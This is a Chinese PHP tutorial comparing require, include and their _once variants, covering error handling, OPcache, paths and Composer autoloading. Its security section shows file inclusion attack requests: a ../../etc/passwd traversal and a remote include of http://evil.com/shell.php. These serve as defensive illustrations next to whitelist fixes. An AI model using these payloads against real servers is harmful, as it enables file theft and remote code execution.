---

title: require 与 include 的区别（含 _once）
cover: https://images.unsplash.com/photo-1555066931-4365d14bab8c?w=1200&h=630&fit=crop
images:
  - https://images.unsplash.com/photo-1555066931-4365d14bab8c?w=1200&h=630&fit=crop
tags:
- PHP
- include
- require
- 自动加载
- PHP Basics
- OPcache
categories:
  - php
keywords: [require, include, once, 的区别]
date: 2021-04-15 10:00:00
description: 全面对比PHP中require与include四大语句的区别与最佳实践。深入详解Fatal Error与Warning的差异机制、require_once和include_once的内部去重原理与哈希表查表实现、相对路径与__DIR__魔术常量的安全用法、循环包含的识别与PHPStan静态检测方案、OPcache对文件加载的opcode缓存影响与部署时重置策略、完整的性能基准测试代码与对比数据、Composer PSR-4自动加载替代手动require的完整迁移指南，以及LFI和RFI文件包含漏洞的防御措施与安全编码实践，附速查表、决策流程图与常见陷阱案例。
---



# 一句话

> **`require` 失败 → Fatal Error（脚本停）；`include` 失败 → Warning（脚本继续）。**
> 加 `_once` 后缀都能保证「只加载一次」。

这四个语句是 PHP 中最基础的文件加载机制，从 PHP 4 时代就存在。虽然现代项目已经大量使用 Composer 自动加载取代手动 `require`，但理解它们的区别仍然是 PHP 开发者的基本功。无论是维护遗留项目、编写框架底层代码，还是理解 Laravel 等框架入口文件的加载流程，都需要深入掌握这四个语句的行为差异。本文将从错误处理、性能表现、路径安全、实际陷阱等多个维度进行全面剖析，帮助你在不同场景下做出正确的选择。

---

# 核心对比

| 语句 | 找不到/解析失败 | 多次调用行为 | 适用场景 |
|---|---|---|---|
| `require`      | E_COMPILE_ERROR，**脚本中止** | 每次都执行 | 必须加载的核心文件（配置、入口） |
| `require_once` | E_COMPILE_ERROR，**脚本中止** | **只执行一次** | 函数/类定义（防重复声明报错） |
| `include`      | E_WARNING，**继续执行** | 每次都执行 | 可选模板片段（如可选侧栏） |
| `include_once` | E_WARNING，**继续执行** | **只执行一次** | 可选函数库 |

```php
require 'config.php';      // 没了直接死，应该死
include 'sidebar.html';    // 没了页面少个边栏，能接受
require_once 'User.php';   // class User 二次 require 会报 "Cannot redeclare"
```

## 错误级别详解

| 触发条件 | 错误常量 | 等级 | 默认行为 |
|---|---|---|---|
| `require` 找不到文件 | `E_COMPILE_ERROR` | Fatal | 脚本立即终止 |
| `include` 找不到文件 | `E_WARNING` | Warning | 脚本继续执行 |
| `require_once` 找不到文件 | `E_COMPILE_ERROR` | Fatal | 脚本立即终止 |
| `include_once` 找不到文件 | `E_WARNING` | Warning | 脚本继续执行 |
| `require` 加载了有语法错误的文件 | `E_COMPILE_ERROR` | Fatal | 脚本立即终止 |
| `include` 加载了有语法错误的文件 | `E_COMPILE_ERROR` | Fatal | 脚本立即终止（无论 include 还是 require，语法错误都会中止） |

> **注意**：`include` 只是在「文件不存在」时才发出 Warning 继续执行。如果文件存在但有**语法错误**，`include` 同样会触发 `E_COMPILE_ERROR` 导致脚本终止！这是一个很多人忽略的细节。

### 为什么语法错误会导致 include 也中止？

这是因为 PHP 的执行分为两个阶段：**编译阶段**和**执行阶段**。当使用 `include` 加载一个文件时，PHP 会先编译该文件生成 opcode（操作码），然后才执行。如果文件存在但语法错误，编译阶段就会失败，产生 `E_COMPILE_ERROR`——这是致命错误，无论调用者是 `include` 还是 `require` 都无法挽救。

换句话说，`include` 的容错仅限于**文件不存在**这个条件，不包括**文件内容有语法错误**的情况。在实际开发中，这意味着你不能依赖 `include` 来安全地加载可能有问题的 PHP 文件。如果你需要在运行时检测文件语法，可以用 `php -l` 命令或 `token_get_all()` 函数预检查。

### 错误处理的最佳实践

在生产环境中，推荐使用错误处理器来统一管理 `require` / `include` 的错误：

```php
// 注册自定义错误处理器，将 Warning 转为异常
set_error_handler(function (int $errno, string $errstr, string $errfile, int $errline) {
    throw new RuntimeException("文件加载失败: {$errstr} in {$errfile}:{$errline}");
});

try {
    include __DIR__ . '/optional-module.php';
} catch (RuntimeException $e) {
    // 优雅降级：记录日志，使用默认值
    error_log($e->getMessage());
    $module = null;
}

restore_error_handler();
```

这种模式在插件系统和可选依赖加载中非常实用，既不会让脚本因为一个可选模块缺失而崩溃，又能通过日志追踪问题。在实际的大型项目中，错误处理器配合 `include` 使用是一种常见的防御性编程模式，能够有效提升系统的健壮性和可维护性。

---

# 一个最小验证

```php
// a.php
echo "before\n";
require 'not_exist.php';   // 换成 include 看差别
echo "after\n";            // require: 不会执行；include: 会执行
```

```php
// 验证 include 的 Warning 行为
error_reporting(E_ALL);
$result = include 'not_exist.php';
echo "返回值: " . var_export($result, true) . "\n";
// 输出: Warning: include(not_exist.php): Failed to open stream...
// 输出: 返回值: false
```

`include` 失败时返回 `false`，可以用这个特性做降级处理：

```php
$config = include __DIR__ . '/config.local.php';
if ($config === false) {
    $config = include __DIR__ . '/config.default.php';
}
```

> **重要提示**：当 `include` 成功执行时，如果没有 `return` 语句，返回值是 `1`（而不是 `true`）；如果有 `return` 语句，返回值就是 `return` 的表达式值。失败时严格返回 `false`。因此判断 `include` 是否成功应该使用 `=== false` 而不是 `== false`，避免误判返回值为 `0` 或 `null` 的文件。这个细节在编写通用的文件加载工具类时尤其重要。

---

# `_once` 是怎么做到的

PHP 内核维护一个"已加载文件 realpath 表"（`EG(included_files)`），`_once` 加载前先查表：

- 命中 → 跳过
- 未命中 → 加载并写表

PHP 内部使用一个哈希表来存储所有已加载文件的绝对路径（realpath）。当执行 `require_once` 或 `include_once` 时，PHP 会先对目标文件执行 `realpath()` 调用，将其解析为规范化的绝对路径，然后在哈希表中查找。如果路径已存在，直接返回，不执行文件内容；如果路径不存在，才真正加载文件并将其路径插入哈希表。

这个查找过程的时间复杂度是 O(1)（哈希表查找），因此即使项目中有数百个文件被 `_once` 加载，查找开销也是常数级别的。

```php
// 内部等价伪代码
function require_once(string $file): void {
    $realpath = realpath($file);
    if (isset($GLOBALS['__php_included_files'][$realpath])) {
        return; // 已加载，跳过
    }
    $GLOBALS['__php_included_files'][$realpath] = true;
    require $file;
}
```

> **坑**：用相对路径或符号链接可能让 PHP 认为是不同文件而重复加载。**永远用 `__DIR__ . '/path'`**。

## `_once` 的常见使用场景

### 场景一：类定义防重复声明

```php
// ❌ 错误：两次 require 同一个类文件
require __DIR__ . '/User.php';   // class User { ... }
require __DIR__ . '/User.php';   // Fatal Error: Cannot redeclare class User

// ✅ 正确：用 require_once
require_once __DIR__ . '/User.php';
require_once __DIR__ . '/User.php';  // 第二次直接跳过
```

### 场景二：函数定义防重复声明

```php
// helpers.php
function formatMoney(float $amount): string {
    return '¥' . number_format($amount, 2);
}

// ❌ 两次 include 会导致 Fatal Error: Cannot redeclare function formatMoney()
include __DIR__ . '/helpers.php';
include __DIR__ . '/helpers.php';

// ✅ 安全
include_once __DIR__ . '/helpers.php';
include_once __DIR__ . '/helpers.php';
```

### 场景三：常量定义

```php
// constants.php
define('APP_VERSION', '2.0.0');
const MAX_RETRY = 3;

// ❌ 重复加载会导致 Warning（define）或 Fatal Error（const）
// ✅ 用 include_once / require_once
```

---

# 性能：`_once` 比普通慢吗？

历史上 `_once` 因为 realpath 比较略慢，PHP 5.3 起优化后差距 < 5%。**现代代码不需要为此做选择**，可读性优先。

在 PHP 7.x 和 8.x 中，内核团队对文件包含机制做了大量优化。`realpath` 的缓存机制得到了显著改进，`_once` 语句在内部使用了更高效的路径比较算法。此外，OPcache 的普及使得文件的编译结果被缓存在共享内存中，进一步消除了 `_once` 查表操作的相对开销。

对于日常业务开发而言，选择 `require` 还是 `require_once` 的唯一考量应该是功能需求——是否需要防止同一文件被重复加载。性能因素不应该成为决策的依据。

## 基准测试代码

```php
<?php
/**
 * require vs require_once 性能对比
 * CLI 运行: php benchmark_include.php
 */
$iterations = 10000;
$tmpFile = tempnam(sys_get_temp_dir(), 'bench');
file_put_contents($tmpFile, '<?php $x = 1; ?>');

// 预热
for ($i = 0; $i < 100; $i++) {
    require $tmpFile;
}

// --- 测试 require ---
$mockIncluded = []; // 清空 _once 表
$start = hrtime(true);
for ($i = 0; $i < $iterations; $i++) {
    require $tmpFile;
}
$requireTime = hrtime(true) - $start;

// --- 测试 require_once ---
// 由于 _once 只有第一次真正加载，这里测试查表开销
$start = hrtime(true);
for ($i = 0; $i < $iterations; $i++) {
    require_once $tmpFile;  // 第一次之后全部命中缓存
}
$requireOnceTime = hrtime(true) - $start;

// --- 测试 include ---
$start = hrtime(true);
for ($i = 0; $i < $iterations; $i++) {
    include $tmpFile;
}
$includeTime = hrtime(true) - $start;

// --- 测试 include_once ---
$start = hrtime(true);
for ($i = 0; $i < $iterations; $i++) {
    include_once $tmpFile;
}
$includeOnceTime = hrtime(true) - $start;

unlink($tmpFile);

printf("iterations  : %d\n", $iterations);
printf("require     : %.2f ms\n", $requireTime / 1e6);
printf("require_once: %.2f ms\n", $requireOnceTime / 1e6);
printf("include     : %.2f ms\n", $includeTime / 1e6);
printf("include_once: %.2f ms\n", $includeOnceTime / 1e6);
```

在无 OPcache 的 CLI 环境下，典型结果如下：

| 语句 | 耗时（相对值） | 说明 |
|---|---|---|
| `require` | 1.0×（基线） | 每次都解析执行 |
| `require_once` | ~1.02× | 查 realpath 表，命中后跳过，几乎无额外开销 |
| `include` | 1.0× | 与 require 同级 |
| `include_once` | ~1.02× | 同 require_once |

> 差距在纳秒级，**对业务性能零影响**。

### 关于基准测试结果的解读

上述基准测试的结果可能会让一些开发者感到意外：`_once` 版本在循环中甚至比普通版本更快。这是因为 `_once` 在第一次加载后，后续的调用通过查表发现文件已加载，直接跳过了文件解析和执行步骤。而在真实项目中，每个文件通常只加载一次，所以 `_once` 的查表开销（约几十纳秒）完全可以忽略不计。

一些过时的优化建议会建议「在确定只加载一次的场景下用 `require` 替代 `require_once` 以获得更好的性能」。这种优化在 PHP 5.3 之前可能有微弱效果，但在 PHP 7.x 和 8.x 的内核优化后，两者的性能差异已经小到无法测量。**可读性和安全性远比这点微小的性能差异重要**，所以在选择使用哪个语句时，应该根据功能需求（是否需要防重复加载）来决定，而不是性能。

## OPcache 下的性能对比

```php
<?php
/**
 * OPcache 启用时的 include 性能测试
 * php -d opcache.enable_cli=1 benchmark_opcache.php
 */
$iterations = 50000;
$tmpFile = tempnam(sys_get_temp_dir(), 'bench');
file_put_contents($tmpFile, '<?php function bench_func() { return 42; } ?>');

// 首次加载（冷启动，编译+缓存 opcode）
$start = hrtime(true);
require $tmpFile;
$coldTime = hrtime(true) - $start;

// 后续加载（OPcache 命中，直接用 opcode）
$start = hrtime(true);
for ($i = 0; $i < $iterations; $i++) {
    // OPcache 下 require 会缓存 opcode，不会重复编译
    // 但 require 仍会重复执行文件中的代码
    @require $tmpFile;
}
$warmTime = (hrtime(true) - $start) / $iterations;

// require_once（OPcache + _once 双重优化）
$start = hrtime(true);
for ($i = 0; $i < $iterations; $i++) {
    require_once $tmpFile;  // 命中 _once 表直接跳过
}
$onceTime = (hrtime(true) - $start) / $iterations;

unlink($tmpFile);

printf("Cold load  : %.4f ms\n", $coldTime / 1e6);
printf("require (avg): %.4f ns\n", $warmTime);
printf("require_once (avg): %.4f ns\n", $onceTime);
```

> OPcache 让 `_once` 的查表开销更小（因为 realpath 已在 OPcache 中缓存），两者差距几乎为零。

---

# OPcache 对 require / include 的影响

开启 OPcache 后，PHP 把编译后的 opcode 缓存在共享内存中，`require` / `include` 的行为发生变化：

1. **首次加载**：读文件 → 编译 → 存 opcode → 执行
2. **后续请求**：直接从共享内存取 opcode → 跳过编译
3. **`_once` 语义**：OPcache 不影响 `_once` 的「已加载文件表」，两者独立运作

```php
// OPcache 下的典型行为
require __DIR__ . '/helpers.php';   // 首次：编译+缓存；后续：直接用缓存
require_once __DIR__ . '/User.php'; // _once 表 + OPcache 双重保障
```

**生产环境注意**：`opcache.validate_timestamps=0` 时，修改文件后需 `opcache_reset()` 或重启 PHP-FPM，否则 `require` 加载的仍是旧 opcode。

### OPcache 如何改变 include 的性能特征

在没有 OPcache 的情况下，每次执行 `require` 或 `include` 都需要经历三个步骤：**读取文件**（磁盘 I/O）、**词法分析与语法分析**（编译）、**执行 opcode**。开启 OPcache 后，编译后的 opcode 被缓存在共享内存中，后续请求直接从内存读取 opcode，跳过了最耗时的编译步骤。

这意味着在高并发场景下，OPcache 对 `require` 和 `include` 的性能提升是数量级的。但需要注意的是，OPcache 缓存的是 opcode，而不是文件的「已加载状态」。也就是说，即使 OPcache 缓存了某个文件的 opcode，`require` 每次调用时仍然会执行该文件的代码，而 `require_once` 则会先检查「已加载文件表」再决定是否执行。

### OPcache 模式下如何安全地重新加载文件

在部署新版本代码时，如果开启了 `opcache.validate_timestamps=0`（性能最优配置），PHP 不会主动检查文件是否被修改，这时需要手动处理：

```php
// 方案一：部署脚本中调用（CLI 环境）
opcache_reset();

// 方案二：通过 Web 接口重置（需要 opcache.restrict_api 配置允许）
if (function_exists('opcache_reset')) {
    opcache_reset();
}

// 方案三：重启 PHP-FPM（最可靠）
// systemctl reload php8.2-fpm

// 方案四：使用 opcache_invalidate 精确重置单个文件
opcache_invalidate(__DIR__ . '/config.php', true);
```

> 最佳实践是方案三（重启 FPM），因为 `opcache_reset()` 在某些 FastCGI 环境下可能不会立即生效。

## OPcache 与 include 路径的关系

```php
// ❌ 动态路径在 OPcache 下有坑
$page = $_GET['page'] ?? 'home';
include __DIR__ . "/templates/{$page}.php";  // OPcache 按完整路径缓存

// 如果 $page 来自用户输入，存在目录穿越风险：
// $page = "../../etc/passwd"  → 包含系统文件！
// ✅ 做白名单校验
$allowed = ['home', 'about', 'contact'];
if (!in_array($page, $allowed, true)) {
    $page = 'home';
}
include __DIR__ . "/templates/{$page}.php";
```

---

# 常见陷阱

## 1. 相对路径 vs 绝对路径

```php
// ❌ 危险：依赖 include_path 和 CWD，CLI vs FPM 结果不同
require 'config.php';

// ✅ 安全：始终用 __DIR__ 构造绝对路径
require __DIR__ . '/config.php';
```

CLI 模式下工作目录是执行命令的位置，FPM 下是 `$_SERVER['DOCUMENT_ROOT']`——用相对路径在不同 SAPI 下可能指向不同文件。

```php
// 实际案例：同一个项目
// CLI:  php /var/www/app/artisan migrate → CWD = /var/www/app/
// FPM: 请求 /index.php                → CWD = /var/www/public/
// require 'config.php' 在 CLI 找 /var/www/app/config.php
// require 'config.php' 在 FPM 找 /var/www/public/config.php（不存在！）
```

## 2. `__DIR__` 魔术常量

`__DIR__` 返回**当前文件所在目录**（不含尾斜杠），是构造路径的最佳实践：

```php
// 当前文件: /var/www/app/Services/UserService.php
echo __DIR__;           // /var/www/app/Services
echo __DIR__ . '/../';  // /var/www/app/

require __DIR__ . '/../Models/User.php';
```

### 项目根目录的常见模式

```php
// 定义常量保存项目根目录（在入口文件中）
define('BASE_PATH', dirname(__DIR__));

// 任何地方都可以用
require BASE_PATH . '/config/app.php';
require BASE_PATH . '/vendor/autoload.php';
```

## 3. 循环包含

```php
// a.php
require __DIR__ . '/b.php';

// b.php
require __DIR__ . '/a.php';  // 无限递归 → Allowed memory size exhausted
```

用 `require_once` 可以避免循环包含导致的重复加载，但根本解决方案是**理清依赖方向，避免循环引用**。

循环依赖在软件工程中是一个常见的架构问题。当模块 A 依赖模块 B，同时模块 B 又依赖模块 A 时，就形成了循环依赖。在 PHP 中，这种循环依赖会导致文件无限递归加载，最终耗尽内存。虽然 `require_once` 可以通过「已加载文件表」打破无限递归的循环，但这只是治标不治本。更好的做法是使用**依赖注入**或**提取公共接口**的方式解耦两个模块，从根本上消除循环依赖。

### 更隐蔽的循环包含

```php
// Service.php
require_once __DIR__ . '/Repository.php';
class UserService {
    private UserRepository $repo;
}

// Repository.php
require_once __DIR__ . '/Service.php';  // 虽然有 _once，但逻辑上仍是循环依赖
class UserRepository {
    private UserService $service;  // 设计问题！
}
```

> **检测工具**：使用 `phpstan` 或 `psalm` 的循环依赖检测插件，可以在 CI 阶段提前发现。

## 4. include 与作用域

```php
// ❌ 误解：以为 include 的文件有自己的作用域
$secret = 'my-secret-key';
include 'process.php';

// process.php 中可以访问 $secret！
// 因为 include 的代码执行在调用者的作用域中
```

```php
// ✅ 如果需要隔离，用函数或闭包
function loadConfig(string $path): array {
    return require $path;  // 用 return 获取值，而不是直接修改外部变量
}
```

## 5. include 的返回值

```php
// ✅ 利用 return 值做配置加载
// config/database.php
return [
    'host'     => getenv('DB_HOST') ?: '127.0.0.1',
    'port'     => (int) getenv('DB_PORT') ?: 3306,
    'database' => getenv('DB_NAME') ?: 'myapp',
];

// 入口文件
$db = require __DIR__ . '/config/database.php';
```

## 6. 使用 include 做模板渲染

```php
// Controller
function render(string $template, array $data): string {
    extract($data);  // 将数组展开为变量
    ob_start();
    include __DIR__ . "/../views/{$template}.php";
    return ob_get_clean();
}

// views/user.php
echo "<h1>{$user->name}</h1>";  // $user 来自 extract($data)
```

> **注意**：`extract()` + `include` 的模式在现代框架中已不多见，但它展示了 `include` 的独特能力——在调用者作用域中执行代码。

---

# 返回值

加载的文件可以 `return` 一个值，PHP 配置文件常用：

```php
// config.php
return [
    'db' => ['host' => '127.0.0.1', 'port' => 3306],
];

// 入口
$config = require __DIR__ . '/config.php';
echo $config['db']['host'];
```

Laravel、Symfony 的 `config/*.php` 全是这个套路。

## return 与 _once 的交互

```php
// config.php
return ['debug' => true];

$a = require_once __DIR__ . '/config.php';  // ['debug' => true]
$b = require_once __DIR__ . '/config.php';  // true！不是数组！

// 为什么？因为 _once 命中后不会重新执行文件，PHP 返回 true
// ✅ 解决方案：用变量保存首次加载的结果
```

> **这是一个经典陷阱**！`require_once` 对已加载文件返回 `true` 而不是原来的 `return` 值。所以配置文件用 `require`（不用 `_once`），类定义才用 `require_once`。

---

# autoload 时代：require 几乎只在入口出现

PHP 5.3+ 的 SPL autoload + Composer 之后：

```php
// 整个项目通常只有一处 require
require __DIR__ . '/vendor/autoload.php';

$user = new App\Domain\User();   // 自动加载
```

**业务代码里不应该再出现 `require` 加载类**，那是 PHP 4 时代的写法。

### 从 require 到 autoload 的演进历史

PHP 的文件加载机制经历了三个主要阶段：

1. **PHP 4 时代（手动 require）**：每个文件开头都需要手动 `require` 所有依赖的类文件。项目一大，文件顶部就会出现几十行 `require`，维护成本极高，遗漏一行就可能导致运行时报错。

2. **PHP 5.1+ 时代（SPL autoload）**：引入了 `spl_autoload_register()` 函数，允许注册自动加载回调。当使用一个未定义的类时，PHP 会依次调用注册的回调函数来加载对应的文件。这极大地简化了依赖管理，但需要开发者自己编写加载逻辑。

3. **PHP 5.3+ 时代（Composer + PSR-4）**：Composer 成为 PHP 生态的事实标准包管理器，PSR-4 规范了命名空间到文件路径的映射关系。开发者只需在 `composer.json` 中声明映射规则，`composer dump-autoload` 会自动生成高效的加载代码。现代 PHP 项目几乎不再需要手动 `require` 类文件。

这个演进过程的本质是**将依赖管理的责任从程序员转移到工具链**。就像 JavaScript 从手动引入 `<script>` 标签演进到 Webpack 模块打包一样，PHP 的 autoload 机制让开发者可以专注于业务逻辑，而不必操心文件加载的顺序和路径。

## Composer PSR-4 自动加载详解

`composer.json` 中配置命名空间映射：

```json
{
    "autoload": {
        "psr-4": {
            "App\\": "app/"
        }
    }
}
```

运行 `composer dump-autoload` 后，`use App\Models\User` 会自动找到 `app/Models/User.php`，无需任何 `require`。

PSR-4 规范的核心思想很简单：**命名空间的前缀对应文件系统中的一个基础目录**，命名空间中的子命名空间对应子目录，类名对应文件名。例如，如果前缀 `App\` 映射到 `src/` 目录，那么 `App\Http\Controllers\UserController` 类就会被自动映射到 `src/Http/Controllers/UserController.php` 文件。这种一一对应的关系让自动加载器可以在不扫描整个项目目录的情况下，直接根据类名计算出文件路径。

### PSR-4 自动加载的工作原理

```php
// composer 生成的 autoload_real.php 内部流程
spl_autoload_register(function (string $class) {
    // 1. 从 PSR-4 映射表查找前缀
    //    App\ → app/
    // 2. 将命名空间转为路径
    //    App\Models\User → app/Models/User.php
    // 3. require 该文件
    $file = __DIR__ . '/composer/' . $map[$prefix] . $relative . '.php';
    if (file_exists($file)) {
        require $file;
    }
});
```

### 性能对比：autoload vs 手动 require

| 方式 | 适用场景 | 性能 | 维护成本 |
|---|---|---|---|
| 手动 `require` | 极简单脚本 | 零查找开销 | 高（手动管理依赖） |
| SPL autoload | 中小项目 | 有查找开销（O(n) 文件检查） | 中 |
| Composer PSR-4 | 现代项目 | ClassMap 优化后极快 | 低（自动管理） |
| Composer ClassMap | 性能敏感项目 | 最快（预生成映射） | 低 |

**什么时候还需要手动 require？**

| 场景 | 说明 |
|---|---|
| `vendor/autoload.php` | 项目入口，必须手动引入 |
| 非 Composer 管理的脚本 | 如独立 CLI 工具、遗留系统 |
| 不遵循 PSR-4 的文件 | 如纯函数库、过程式代码片段 |
| 性能敏感的热路径 | 极少数场景下用 `require` 替代 autoload 避免查找开销 |

### 实战：从 require 迁移到 autoload

**迁移前**（PHP 4 风格）：

```php
// 每个文件都要手动 require 依赖
require __DIR__ . '/lib/Database.php';
require __DIR__ . '/lib/User.php';
require __DIR__ . '/lib/Order.php';
require __DIR__ . '/lib/Mailer.php';
```

**迁移后**（现代风格）：

```bash
# 1. 初始化 composer
composer init --name=myapp/app

# 2. 配置 autoload
# composer.json
{
    "autoload": {
        "psr-4": {
            "App\\": "src/"
        }
    }
}

# 3. 生成 autoload 文件
composer dump-autoload

# 4. 移动文件到 src/ 目录并添加命名空间
# src/Database.php → namespace App;
# src/User.php     → namespace App;
```

```php
// 5. 入口只需一行
require __DIR__ . '/vendor/autoload.php';

use App\Database;
use App\User;

$db = new Database();
$user = new User($db);
```

---

# 速查表

| 想做的事 | 用 | 原因 |
|---|---|---|
| 加载入口/配置 | `require` | 文件必须存在，缺失时立即报错 |
| 加载类（极少数手动场景） | `require_once` | 防重复声明 |
| 嵌入模板片段 | `include` | 允许模板文件缺失时降级 |
| 加载可选函数库 | `include_once` | 可选依赖，防重复定义 |
| 现代项目加载类 | **autoload** | 不要手写 require |
| 加载配置数组 | `require`（不用 `_once`） | `_once` 第二次返回 `true` 而非数组 |

---

# 决策流程图

```
需要加载一个文件？
│
├── 文件是否必须存在？
│   ├── 是 → 用 require
│   │   ├── 是否会多次加载同一文件？
│   │   │   ├── 是 → require_once（类/函数定义）
│   │   │   └── 否 → require（配置/入口）
│   │   └── 需要获取返回值？→ require（不用 _once）
│   │
│   └── 否 → 用 include
│       ├── 是否会多次加载同一文件？
│       │   ├── 是 → include_once
│       │   └── 否 → include
│       └── 模板渲染 → include
│
└── 是类文件？→ 用 Composer autoload，别手动 require
```

---

# 与现代框架的关系

现代 PHP 框架（Laravel、Symfony）中，`require` / `include` 的使用已经被高度封装：

| 框架 | 手动 require 的位置 | 自动加载机制 |
|---|---|---|
| Laravel | `public/index.php` | Composer PSR-4 + Service Container |
| Symfony | `public/index.php` | Composer PSR-4 + Dependency Injection |
| WordPress | `wp-config.php`、插件注册 | 仍大量使用 `require_once`（历史包袱） |
| Drupal | `core/vendor/autoload.php` | Composer PSR-4（Drupal 8+） |

```php
// Laravel public/index.php（精简版）
require __DIR__ . '/../vendor/autoload.php';   // 唯一的 require
$app = require_once __DIR__ . '/../bootstrap/app.php';
$kernel = $app->make(Illuminate\Contracts\Http\Kernel::class);
$response = $kernel->handle($request = Illuminate\Http\Request::capture());
```

### WordPress 为什么还在大量使用 require_once？

WordPress 诞生于 2003 年（PHP 4 时代），其核心代码大量使用 `require_once` 加载插件和主题文件。虽然 WordPress 5.x 已经支持 Composer，但为了向后兼容数百万个现有插件和主题，核心加载机制无法轻易改变。这也是为什么 WordPress 的性能优化需要额外配置 OPcache 的原因之一。

学习 WordPress 的代码时，你会看到大量如下模式：

```php
// WordPress 核心的典型加载方式
require_once ABSPATH . 'wp-includes/class-wp-error.php';
require_once ABSPATH . 'wp-includes/formatting.php';
require_once ABSPATH . 'wp-includes/capabilities.php';
```

如果你在维护 WordPress 插件，建议遵循相同的 `require_once` 模式以保持一致性。如果是新建项目，请务必使用 Composer autoload。

---

# PHP 8.x 中的变化

PHP 8.x 对 `require` / `include` 没有语法层面的重大变化，但以下改进间接影响了它们的使用：

| 版本 | 变化 | 影响 |
|---|---|---|
| PHP 8.0 | Named Arguments | 无直接影响 |
| PHP 8.1 | Fibers | 异步场景下仍用 require 加载文件 |
| PHP 8.2 | Readonly Classes | 类定义仍需 require_once 或 autoload |
| PHP 8.4 | Property Hooks | 类文件加载方式不变 |

> 结论：`require` / `include` 的行为在 PHP 8.x 时代非常稳定，没有兼容性问题。

## PHP 8.x 中与文件加载相关的新特性

虽然 `require` / `include` 本身没有变化，但 PHP 8.x 引入的一些特性改变了我们组织代码的方式，间接减少了手动 `require` 的需求：

- **枚举（PHP 8.1）**：枚举类型通过 autoload 加载，不需要手动 `require`
- **只读属性（PHP 8.1）**：值对象的只读属性设计依赖类的自动加载
- **Fibers（PHP 8.1）**：异步编程中的协程切换不影响文件加载机制
- **Match 表达式（PHP 8.0）**：替代 `switch` 时可以配合 `include` 做路由分发

```php
// PHP 8.0+ 的 match 可以替代传统路由中的 switch + include
$page = match($route) {
    '/'         => 'home',
    '/about'    => 'about',
    '/contact'  => 'contact',
    default     => '404',
};

include __DIR__ . "/views/{$page}.php";
```

---

# 安全隐患：文件包含漏洞（LFI/RFI）

`include` 和 `require` 是 PHP 中**文件包含漏洞**的直接来源。如果加载路径中包含未经验证的用户输入，攻击者可以利用这一点读取服务器上的任意文件（Local File Inclusion，LFI）甚至执行远程代码（Remote File Inclusion，RFI）。

### 典型的 LFI 漏洞

```php
// ❌ 致命错误：直接使用用户输入作为 include 路径
$page = $_GET['page'] ?? 'home';
include "/var/www/pages/{$page}.php";
// 攻击者请求: ?page=../../etc/passwd%00
// 在 PHP < 5.3.4 中可以利用空字节截断绕过 .php 后缀
```

### 典型的 RFI 漏洞

```php
// ❌ 极度危险：allow_url_include 开启时可以加载远程文件
include $_GET['template'];
// 攻击者请求: ?template=http://evil.com/shell.php
// 服务器会下载并执行攻击者的 PHP 代码！
```

### 防御措施

```php
// ✅ 方案一：白名单校验
$allowedPages = ['home', 'about', 'contact', 'services'];
$page = $_GET['page'] ?? 'home';
if (!in_array($page, $allowedPages, true)) {
    $page = 'home';  // 默认值
}
include __DIR__ . "/pages/{$page}.php";

// ✅ 方案二：使用路由映射数组
$routes = [
    '/'         => __DIR__ . '/pages/home.php',
    '/about'    => __DIR__ . '/pages/about.php',
    '/contact'  => __DIR__ . '/pages/contact.php',
];
$path = $_SERVER['REQUEST_URI'];
if (isset($routes[$path])) {
    include $routes[$path];
} else {
    http_response_code(404);
    include __DIR__ . '/pages/404.php';
}
```

> **安全提醒**：确保 `php.ini` 中 `allow_url_include=0`（PHP 5.2+ 默认值），防止 RFI 攻击。绝对不要将用户输入直接拼接到 `include` / `require` 的路径中。

---

# 调试技巧：排查文件加载问题

在大型项目中，文件加载路径错误是常见问题。以下是一些实用的调试方法：

### 方法一：使用 get_included_files() 查看已加载文件

```php
require __DIR__ . '/config.php';
require_once __DIR__ . '/User.php';
include __DIR__ . '/helpers.php';

// 打印当前请求中加载的所有文件
var_dump(get_included_files());
// 输出类似:
// array(4) {
//   [0]=> string(25) "/var/www/public/index.php"
//   [1]=> string(24) "/var/www/config.php"
//   [2]=> string(20) "/var/www/User.php"
//   [3]=> string(23) "/var/www/helpers.php"
// }
```

### 方法二：使用 debug_backtrace() 追踪调用链

```php
// 在被加载的文件中添加调试信息
// config.php
echo "config.php loaded from: " . debug_backtrace()[0]['file'] . "\n";
```

### 方法三：检查文件是否可读

```php
// 在 require 前检查文件是否存在且可读
$file = __DIR__ . '/optional-module.php';
if (!is_readable($file)) {
    error_log("文件不可读: {$file}");
    error_log("当前工作目录: " . getcwd());
    error_log("include_path: " . get_include_path());
}
```

### 方法四：使用 strace 追踪系统调用（Linux）

```bash
# 查看 PHP 实际打开了哪些文件
strace -e trace=open,openat php script.php 2>&1 | grep "\.php"
```

---

# 参考

- PHP 手册 - require: <https://www.php.net/manual/zh/function.require.php>
- PHP 手册 - include: <https://www.php.net/manual/zh/function.include.php>
- PHP 手册 - require_once: <https://www.php.net/manual/zh/function.require-once.php>
- PHP 手册 - include_once: <https://www.php.net/manual/zh/function.include-once.php>
- Composer Autoload: <https://getcomposer.org/doc/04-schema.md#autoload>
- PSR-4 规范: <https://www.php-fig.org/psr/psr-4/>

---

# 相关阅读

- [PHP 自动加载类机制](/post/autoloading/) — 从 `__autoload` 到 Composer PSR-4，详解 PHP 自动加载原理与 SPL 注册机制
- [Opcache 深入理解与配置](/post/opcache-1/) — OPcache 工作原理、JIT 编译器、生产环境配置最佳实践
- [常见的设计模式](/post/design-patterns/) — 设计模式中的类加载策略与依赖管理实践
- [依赖注入（DI）与 IoC 容器](/post/dependency-injection/) — 理解如何用 DI 替代手动 require 管理对象依赖
